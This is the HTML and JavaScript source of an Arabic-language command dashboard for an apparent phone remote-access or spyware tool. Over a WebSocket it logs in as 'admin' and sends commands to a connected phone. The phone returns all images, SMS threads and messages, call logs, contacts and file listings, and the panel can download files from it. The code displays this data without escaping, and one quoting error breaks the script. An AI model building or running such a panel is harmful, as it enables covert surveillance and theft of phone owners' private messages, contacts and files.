<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>Dashboard Pro - Render Edition</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { background-color: #000; margin: 0; padding: 0; font-family: sans-serif; color: #fff; }
        .header { background: #1a1a1a; padding: 15px; border-bottom: 1px solid #333; text-align: center; position: sticky; top: 0; z-index: 100; }
        .main-menu { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; padding: 20px 10px; }
        .menu-item { background: #1c1c1e; border-radius: 15px; padding: 20px 5px; text-align: center; cursor: pointer; border: 1px solid #333; transition: 0.2s; }
        .menu-item:active { transform: scale(0.95); }
        .icon-box { font-size: 28px; margin-bottom: 8px; display: inline-block; padding: 10px; border-radius: 12px; }
        .menu-item span { font-size: 11px; display: block; }
        
        #content-view { padding: 10px; display: none; }
        .grid-layout { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; }
        
        .table-container { overflow-x: auto; background: #1c1c1e; border-radius: 12px; border: 1px solid #333; margin-top: 10px; }
        table { width: 100%; border-collapse: collapse; font-size: 13px; }
        th, td { padding: 12px; text-align: right; border-bottom: 1px solid #333; }
        th { background: #2c2c2e; color: #0a84ff; }

        .data-card { background: #1c1c1e; border: 1px solid #333; border-radius: 10px; padding: 5px; text-align: center; cursor: pointer; }
        .data-card img { width: 100%; height: 100px; object-fit: cover; border-radius: 8px; }

        .chat-container { display: flex; flex-direction: column; gap: 10px; padding: 10px; background: #000; }
        .msg-bubble { max-width: 85%; padding: 12px 16px; border-radius: 18px; font-size: 14px; line-height: 1.4; }
        .received { background: #262629; color: #fff; align-self: flex-end; border-bottom-left-radius: 4px; }
        .sent { background: #0a84ff; color: #fff; align-self: flex-start; border-bottom-right-radius: 4px; }
        .msg-time { display: block; font-size: 10px; color: #8e8e93; margin-top: 5px; }

        .side-tools { position: fixed; bottom: 20px; left: 20px; display: flex; flex-direction: column; gap: 10px; }
        .btn-circle { width: 55px; height: 55px; border-radius: 50%; border: none; color: white; font-size: 22px; cursor: pointer; display: flex; align-items: center; justify-content: center; box-shadow: 0 4px 15px rgba(0,0,0,0.6); }
        
        #loading { position: fixed; top: 15px; left: 15px; background: #34c759; color: #000; padding: 4px 10px; border-radius: 20px; font-size: 11px; font-weight: bold; display: none; z-index: 3000; }
        #status { font-size: 13px; font-weight: bold; }
    </style>
</head>
<body>

<div id="loading">جاري جلب البيانات...</div>

<div class="header">
    <div id="status" style="color: #ff3b30;">🔴 جاري محاولة الاتصال بالسيرفر...</div>
</div>

<div id="menu-screen" class="main-menu">
    <div class="menu-item" onclick="sendCmd('get_all_images')"><div class="icon-box" style="background: #af52de;">🖼️</div><span>الصور</span></div>
    <div class="menu-item" onclick="sendCmd('sms_threads')"><div class="icon-box" style="background: #34c759;">💬</div><span>الرسائل</span></div>
    <div class="menu-item" onclick="sendCmd('call_logs_full')"><div class="icon-box" style="background: #5856d6;">📞</div><span>السجل</span></div>
    <div class="menu-item" onclick="sendCmd('contacts')"><div class="icon-box" style="background: #ff9500;">👤</div><span>الأسماء</span></div>
    <div class="menu-item" onclick="sendCmd('list_files', '')"><div class="icon-box" style="background: #ffcc00;">📂</div><span>الملفات</span></div>
    <div class="menu-item" onclick="location.reload()"><div class="icon-box" style="background: #8e8e93;">🔄</div><span>تحديث</span></div>
</div>

<div id="content-view"></div>

<div class="side-tools">
    <button class="btn-circle" style="background:#0a84ff;" onclick="goHome()">🏠</button>
</div>

<script>
    let ws;
    // نستخدم wss للاتصال المشفر مع رندر
    const serverUrl = "wss://" + window.location.hostname; 

    function connect() {
        ws = new WebSocket(serverUrl);

        ws.onopen = () => {
            console.log("Connected to Server");
            document.getElementById('status').innerText = "🟡 متصل بالسيرفر: في انتظار الهاتف...";
            document.getElementById('status').style.color = "#ffcc00";
            ws.send(JSON.stringify({ type: 'login_admin' }));
        };

        ws.onclose = () => {
            document.getElementById('status').innerText = "🔴 انقطع الاتصال.. جاري الإعادة";
            document.getElementById('status').style.color = "#ff3b30";
            setTimeout(connect, 3000);
        };

        ws.onmessage = (e) => {
            const res = JSON.parse(e.data);
            const area = document.getElementById('content-view');
            const menu = document.getElementById('menu-screen');
            const loader = document.getElementById('loading');

            if(res.type === 'login') {
                document.getElementById('status').innerText = "🟢 الهاتف متصل: " + res.model;
                document.getElementById('status').style.color = "#34c759";
            }

            if(res.type === 'data') {
                loader.style.display = 'none';
                menu.style.display = 'none';
                area.style.display = 'block';

                if(res.category === 'sms_detailed_view') {
                    let msgs = JSON.parse(res.data);
                    let html = `<h3>المحادثة</h3><div class="chat-container">`;
                    msgs.forEach(m => {
                        let side = (m.type === 1) ? 'received' : 'sent';
                        html += `<div class="msg-bubble ${side}"><div>${m.body}</div><span class="msg-time">${m.date}</span></div>`;
                    });
                    area.innerHTML = html + `</div>`;
                }

                else if(res.category === 'sms_threads') {
                    area.innerHTML = "<h3>المحادثات</h3>";
                    JSON.parse(res.data).forEach(t => {
                        area.innerHTML += `
                            <div class="menu-item" style="text-align:right; margin-bottom:10px; padding:15px;" onclick="sendCmd('sms_messages', '${t.thread_id}')">
                                <b>👤 ${t.name || t.address}</b><br>
                                <small style="color:#aaa;">${t.snippet}</small>
                            </div>`;
                    });
                }

                else if(res.category === 'call_logs_full' || res.category === 'contacts') {
                    let data = JSON.parse(res.data);
                    let html = `<h3>${res.category === 'contacts' ? 'الأسماء' : 'سجل المكالمات'}</h3><div class="table-container"><table><thead><tr>`;
                    if(data.length > 0) {
                        Object.keys(data[0]).forEach(key => html += `<th>${key}</th>`);
                        html += `</tr></thead><tbody>`;
                        data.forEach(row => {
                            html += `<tr>`;
                            Object.values(row).forEach(val => html += `<td>${val}</td>`);
                            html += `</tr>`;
                        });
                        area.innerHTML = html + `</tbody></table></div>`;
                    }
                }

                else if(res.category === 'file_manager') {
                    area.innerHTML = "<h3>الملفات والصور</h3><div class="grid-layout"></div>";
                    const grid = area.querySelector('.grid-layout');
                    JSON.parse(res.data).forEach(item => {
                        const img = item.thumb ? `<img src="data:image/jpeg;base64,${item.thumb}">` : `<div style="font-size:40px; padding:20px;">${item.isDir ? '📁' : '📄'}</div>`;
                        grid.innerHTML += `<div class="data-card" onclick="handleFile('${item.path}', ${item.isDir})">${img}<div>${item.name}</div></div>`;
                    });
                }

                else if(res.category === 'file_download') {
                    const a = document.createElement("a");
                    a.href = `data:application/octet-stream;base64,${res.data}`;
                    a.download = res.name;
                    a.click();
                }
            }
        };
    }

    function handleFile(path, isDir) {
        if(isDir) sendCmd('list_files', path);
        else if(confirm("تحميل الملف؟")) sendCmd('download_file', path);
    }

    function sendCmd(cmd, val="") {
        document.getElementById('loading').style.display = 'block';
        if(ws && ws.readyState === 1) {
            ws.send(JSON.stringify({ type:'command', command:cmd, path:val, thread_id:val }));
        }
    }

    function goHome() {
        document.getElementById('content-view').style.display = 'none';
        document.getElementById('menu-screen').style.display = 'grid';
    }

    connect();
</script>
</body>
</html>
